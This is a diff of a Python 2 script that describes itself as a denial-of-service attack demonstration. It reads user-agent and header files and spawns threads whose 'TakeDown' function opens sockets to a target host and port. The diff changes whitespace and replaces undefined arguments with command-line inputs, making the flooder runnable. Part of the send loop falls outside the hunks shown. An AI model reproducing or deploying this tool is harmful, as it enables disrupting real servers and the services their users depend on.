@@ -1,20 +1,20 @@
 #Demonstration of a Denial of service attack.
 #Email: khanhnn@pythonvietnam.info
- 
+
 import threading
 import socket
 import random
 import sys
- 
+
 global headers,UsAg,host,port
- 
+
 def UserAgent():
     userAg=[]
     File=open("UserAgent.txt","r")   #your path
     for line in File:
         userAg.append(line)
     return userAg
- 
+
 def TakeDown(host="",port=80):
     try:
         sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -35,15 +35,15 @@ def TakeDown(host="",port=80):
                 else:
                     print"Error while sending!"
                     sys.exit()
- 
+
 if __name__=="__main__":
-    host=arg1 #raw_input("Enter host address:")
-    port=arg2 #raw_input("Enter port number:")
-    threads=arg3 #raw_input("Enter number of threads:")
+    host=sys.argv[1] #raw_input("Enter host address:")
+    port=sys.argv[2] #raw_input("Enter port number:")
+    threads=sys.argv[3] #raw_input("Enter number of threads:")
     threads=int(threads)
     port=int(port)
     UsAg=UserAgent()
-   
+
     fp=open("headers.txt","r")
     headers=fp.read()
     fp.close()
